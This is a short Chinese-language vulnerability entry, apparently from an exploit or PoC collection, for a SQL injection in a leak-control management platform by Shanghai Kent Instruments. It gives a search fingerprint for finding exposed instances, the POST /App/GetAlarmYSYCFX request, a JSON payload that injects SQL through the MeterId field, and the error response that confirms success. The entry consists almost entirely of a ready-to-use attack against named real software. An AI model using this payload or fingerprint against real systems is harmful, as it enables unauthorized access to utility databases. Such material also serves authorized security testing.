# 漏损控制管理平台存在GetAlarmYSYCFX存在SQL注入漏洞

漏损控制管理平台 ｜ SQL注入 ｜ —
- **指纹**：`body="上海肯特仪表"`
- **请求**：`POST /App/GetAlarmYSYCFX HTTP/1.1`

**Payload**
```
{"MeterId":"1' AND 84=85 AND 'Lhsd'='Lhsd","AlarmTypeID":20}
```
- **响应特征**：200 XPATH syntax error